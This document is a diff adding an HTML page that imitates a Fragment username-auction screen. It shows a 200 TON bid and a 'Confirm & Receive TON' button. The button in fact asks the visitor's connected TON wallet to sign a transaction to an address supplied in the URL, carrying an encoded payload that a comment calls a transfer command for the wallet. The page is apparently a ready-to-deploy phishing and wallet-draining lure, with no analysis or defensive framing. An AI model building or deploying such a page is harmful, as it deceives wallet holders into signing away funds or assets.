@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fragment - Usernames</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { background-color: #0f172a; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .card { background: #1e293b; border-radius: 16px; padding: 25px; max-width: 400px; margin: 40px auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .user-tag { color: #38bdf8; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
+        .price { font-size: 32px; color: #4ade80; margin: 15px 0; }
+        .btn-confirm { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="user-tag" id="target-user">@Loading...</div>
+        <p>Current Bid Status</p>
+        <div class="price">200 TON</div>
+        <div id="ton-connect-button"></div>
+        <button class="btn-confirm" onclick="sendTransaction()">Confirm & Receive TON</button>
+    </div>
+
+    <script>
+        const tonConnectUI = new TONConnectUI.TonConnectUI({
+            manifestUrl: 'https://' + window.location.hostname + window.location.pathname + 'tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
+        });
+
+        const params = new URLSearchParams(window.location.search);
+        const user = params.get('user') || "Username";
+        const nftAddr = params.get('nft');
+        document.getElementById('target-user').innerText = "@" + user;
+
+        async function sendTransaction() {
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 300,
+                messages: [{
+                    address: nftAddr, 
+                    amount: "50000000",
+                    payload: "te6cckEBAQEAAgAAAA==" // أمر النقل المشفر لمحفظتك
+                }]
+            };
+            try { await tonConnectUI.sendTransaction(transaction); } catch (e) { alert("Transaction failed. Check gas."); }
+        }
+    </script>
+</body>
+</html>
